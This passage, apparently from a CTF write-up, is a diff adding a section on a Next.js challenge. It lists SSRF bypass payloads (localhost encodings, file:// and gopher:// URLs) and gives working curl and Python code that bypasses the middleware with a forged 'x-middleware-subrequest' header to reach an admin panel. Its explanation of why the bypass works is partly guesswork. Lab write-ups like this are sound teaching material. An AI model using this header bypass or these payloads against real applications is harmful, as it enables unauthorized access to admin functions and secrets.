@@ -836,7 +836,214 @@ The flag is extracted from the response: `ictff8{SSTI_Tw1gOwn3d_bY_uS!!!!}`
 
 ---
 
+# 7. Malacca Heritage - SSRF
+
+## Challenge Information
+
+**Target:** http://206.189.34.228:8088
+
+**Description:**
+
+> "Timeless Melaka. A city where centuries of history meet modern vibrancy."
+> 
+> We discovered a beautiful tourist portal for Melaka. The developers claim their admin panel is protected by a "state-of-the-art" custom security middleware that identifies and blocks recursive sub-requests. Can you bypass their protection and uncover the secrets hidden in the server files?
+
+**Flag:** `ictff8{MelakaKotaWarisanBersejarah}`
+
+---
+
+## Initial Reconnaissance
+
+### Website Exploration
+
+The target appears to be a Next.js application with the following structure:
+
+```
+http://206.189.34.228:8088/
+    ├── /                    (Main landing page)
+    ├── /about               (History page)
+    ├── /attractions         (Sights page)
+    ├── /food                (Eats page)
+    └── /admin               (Admin panel - protected)
+```
+
+Key observations:
+
+- **Framework:** Next.js (indicated by `X-Powered-By: Next.js` header)
+- **Target:** `/admin` endpoint showing an admin dashboard
+- **Protection:** Custom middleware blocking recursive sub-requests
+
+---
+
+## Failed Approaches (Standard SSRF Bypasses)
+
+I initially attempted hundreds of standard SSRF bypass techniques, all of which were blocked:
+
+### 1. IP Address Variations
+
+```
+http://127.0.0.1:8088/flag
+http://localhost:8088/flag
+http://127.1:8088/flag
+http://0.0.0.0:8088/flag
+http://2130706433:8088/flag      # Decimal encoding
+http://0x7f000001:8088/flag      # Hex encoding
+http://0177.0.0.1:8088/flag      # Octal encoding
+```
+
+### 2. IPv6 Variations
+
+```
+http://[::1]:8088/flag
+http://[0:0:0:0:0:0:0:1]:8088/flag
+http://[::ffff:127.0.0.1]:8088/flag
+```
+
+### 3. DNS Resolution Services
+
+```
+http://localtest.me:8088/flag
+http://127.0.0.1.nip.io:8088/flag
+http://127.0.0.1.xip.io:8088/flag
+http://lvh.me:8088/flag
+```
+
+### 4. URL Encoding Variations
+
+```
+http://127.0.0.1%3A8088/flag
+http://%6C%6F%63%61%6C%68%6F%73%74:8088/flag
+http://127%2E0%2E0%2E1:8088/flag
+```
+
+### 5. Protocol-Based Bypasses
+
+```
+file:///flag
+gopher://127.0.0.1:8088/_/flag
+dict://127.0.0.1:8088/flag
+```
+
+### 6. Other Techniques
+
+- CRLF injection
+- Parameter pollution
+- Special characters and malformed URLs
+- Unicode variations
+- Directory traversal attempts
+
+**All attempts returned a blocked response (33513 bytes) with `error=unauthorized`.**
+
+---
+
+## The Breakthrough: Understanding Next.js Middleware
+
+The key phrase in the challenge was **"custom security middleware"** that blocks **"recursive sub-requests"**.
+
+### What This Means:
+
+Next.js middleware can track when the server makes requests to itself. The custom middleware was designed to detect and block SSRF attempts by identifying recursive patterns.
+
+### The Insight:
+
+Instead of trying to trick the URL parser, we needed to understand **how Next.js middleware tracks internal requests**.
+
+---
+
+## The Solution: Custom Middleware Header Bypass
+
+### Discovery
+
+The solution involves using a **framework-specific header** that the middleware uses to track internal requests:
+
+```http
+GET /admin HTTP/1.1
+Host: 206.189.34.228:8088
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+```
+
+### Why This Works
+
+1. **Internal Request Marker:** The `x-middleware-subrequest` header is used by Next.js to track middleware-level sub-requests.
+  
+2. **Validation Bypass:** By providing the repeated pattern `middleware:middleware:middleware:middleware:middleware`, the middleware likely:
+  
+  - Thinks it's an internal middleware request
+  - Bypasses the recursive check
+  - Grants access to protected resources
+3. **Depth Exhaustion:** The repeated pattern may exhaust a recursion depth counter or satisfy a specific validation pattern.
+  
+
+### Implementation
+
+```python
+import requests
+
+url = "http://206.189.34.228:8088"
+
+headers = {
+    "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
+}
+
+response = requests.get(f"{url}/admin", headers=headers)
+print(response.text)
+```
+
+### Result
+
+Accessing `/admin` with this header reveals the admin dashboard with a file manager showing `.env.local`:
+
+```
+# ENVIRONMENT VARIABLES
+DB_HOST=127.0.0.1
+API_KEY=sk_test_49284
+FLAG=ictff8{MelakaKotaWarisanBersejarah}
+```
+
+---
+
+## Flag Extraction
+
+Using curl:
+
+```bash
+curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
+     "http://206.189.34.228:8088/admin" | grep -o 'ictff8{[^}]*}'
+```
+
+Using Python:
+
+```python
+import requests
+import re
+
+headers = {
+    "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
+}
+
+response = requests.get("http://206.189.34.228:8088/admin", headers=headers)
+flag = re.search(r'ictff8\{[^}]+\}', response.text).group(0)
+print(f"Flag: {flag}")
+```
+
+**Output:**
+
+```
+Flag: ictff8{MelakaKotaWarisanBersejarah}
+```
+
+---
+
+## References
+
+- [Next.js Middleware Documentation](https://nextjs.org/docs/app/building-your-application/routing/middleware)
+- [SSRF Bypass Techniques](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
+- Next.js Internal Request Tracking
+
+---
+
 Thats it for the web writeup for TAMING CTF Final Round - Alumni Category. Thanks for reading
+
 
 
 
